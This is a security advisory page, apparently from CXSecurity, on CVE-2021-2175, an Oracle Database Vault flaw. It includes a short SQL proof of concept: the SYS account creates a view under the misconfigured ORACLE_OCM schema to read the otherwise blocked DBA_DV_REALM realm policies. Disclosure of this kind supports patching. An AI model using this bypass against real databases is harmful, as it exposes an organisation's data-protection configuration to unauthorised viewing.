---
title: Oracle Database Vault Metadata Exposure
url: https://cxsecurity.com/issue/WLB-2023010005
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-01-06
fetch_date: 2025-10-04T03:07:16.943972
---

# Oracle Database Vault Metadata Exposure

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Oracle Database Vault Metadata Exposure** **2023.01.05**  Credit:  **[Emad Al-Mousa](https://cxsecurity.com/author/Emad%2BAl-Mousa/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2021-2175](https://cxsecurity.com/cveshow/CVE-2021-2175/ "Click to see CVE-2021-2175")** | **[CVE-2021-35576](https://cxsecurity.com/cveshow/CVE-2021-35576/ "Click to see CVE-2021-35576")**  CWE: **N/A** | |

Title: CVE-2021-2175 – Oracle Database Vault Metadata Exposure Vulnerability
Product: Database
Manufacturer: Oracle
Affected Version(s): 12.1.0.2, 12.2.0.1, 18c, 19c
Tested Version(s): 19c
Risk Level: low
Solution Status: Fixed
CVE Reference: CVE-2021-2175
Author of Advisory: Emad Al-Mousa
Overview:
Oracle database vault is a security feature that imposes segregation of duties such as account managemenet, authorization,....etc. So, in a nutshell a DBA/System Admin with access to "SYS" user has limited power in terms of data viewership, account creation,.....etc. The powers of SYS account are stripped down.
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
Vulnerability Details:
Vulnerability in the Database Vault component of Oracle Database Server. Supported versions that are affected are 12.1.0.2, 12.2.0.1, 18c and 19c. Easily exploitable vulnerability allows high privileged attacker having Create Any View, Select Any View privilege with network access via Oracle Net to compromise Database Vault. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Database Vault accessible data [Meta-data].
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
Proof of Concept (PoC):
The DBA\_DV\_REALM data dictionary view lists the realms (security policies configured for data protection) created in the current database instance, such information SYS user by default has NO ACCESS to since it exposes what security measures of data protection is configured.
Access the database as SYS account:
sqlplus / as sysdba
SQL> SELECT \* FROM DBA\_DV\_REALM;
ERROR at line 1:
ORA-01031: insufficient privileges
// as expected SYS account can't view the database view contents.....However...let us do the following:
SQL> create view ORACLE\_OCM.DUMMY\_V as select \* from DBA\_DV\_REALM;
SQL> select \* from ORACLE\_OCM.DUMMY\_V;
// ORACLE\_OCM account is misconfigured and was granted extra access to the view so when you create the view under it....you will be access the view content....and now you can see/view the vault realm policies are configured to protect what exactly within the database system.
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
References:
https://www.oracle.com/security-alerts/cpuapr2021.html
https://databasesecurityninja.wordpress.com/2022/02/02/cve-2021-2175-database-vault-metadata-exposure-vulnerability/
https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-2175
Credit:
Emad Al-Mousa: CVE-2021-35576

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023010005)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top